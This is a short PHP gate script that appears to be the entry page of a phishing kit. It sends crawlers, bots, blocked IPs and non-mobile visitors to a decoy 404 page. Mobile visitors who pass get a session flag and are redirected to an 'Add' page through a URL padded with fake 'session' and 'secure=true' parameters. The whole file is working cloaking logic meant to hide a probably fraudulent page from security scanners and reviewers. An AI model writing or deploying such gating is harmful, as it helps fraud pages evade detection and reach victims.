<?php
	session_start();
	include('inc/functions.php');

	if(checkValidBool($CrawlerDetect, $USER_AGENT) == true) {
		// Check for mobile environment.
		if (!$detect->isMobile()) {
			// If is not mobile
			exit(header('Location: '.$OUR_404_PAGE));
			/*
            setSessions(
              [
                ['name' => 'AllowedAccess', 'val' => 'true']
              ]
            );
			// Is mobile
			header("Location: Add?session=3878hhy78377y393i29nbn3uh84u&secure=true&time=35476432334&origin=h38y4kkj28");
			*/
		} else {

			// Another check for ip blocking
			if(checkForBots($OUR_404_PAGE)) {
				// True is good	
	            setSessions(
	              [
	                ['name' => 'AllowedAccess', 'val' => 'true']
	              ]
	            );
				// Is mobile
				header("Location: Add?session=3878hhy78377y393i29nbn3uh84u&secure=true&time=35476432334&origin=h38y4kkj28");
			} else {
				exit(header('Location: '.$OUR_404_PAGE));
			}
		}
	} else {
		// Crawler / Bot detected
		exit(header('Location: '.$OUR_404_PAGE));
	}
?>